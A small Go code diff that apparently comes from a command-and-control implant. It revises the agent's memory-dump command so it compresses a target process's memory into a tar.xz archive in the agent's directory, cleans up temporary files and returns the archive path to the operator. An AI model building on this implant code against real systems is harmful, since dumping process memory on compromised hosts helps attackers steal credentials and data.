@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"runtime"
 	"strconv"
 	"strings"
 	"time"
@@ -409,9 +410,17 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 				return
 			}
 		}
-		tarball := fmt.Sprintf("%s/%d.tar.xz", outpath, *pid)
-		util.TarXZ(outpath, tarball)
-		out = fmt.Sprintf("Memory dumped, please download %s", tarball)
+		tarball := fmt.Sprintf("%s/%d.tar.xz", RuntimeConfig.AgentRoot, *pid)
+		if runtime.GOOS == "windows" {
+			tarball = strings.ReplaceAll(tarball, "\\", "/")
+		}
+		err = util.TarXZ(outpath, tarball)
+		if err != nil {
+			out = fmt.Sprintf("Error: %v", err)
+			return
+		}
+		defer os.RemoveAll(outpath)
+		out = tarball
 
 	default:
 		// let per-platform C2CommandsHandler do the job
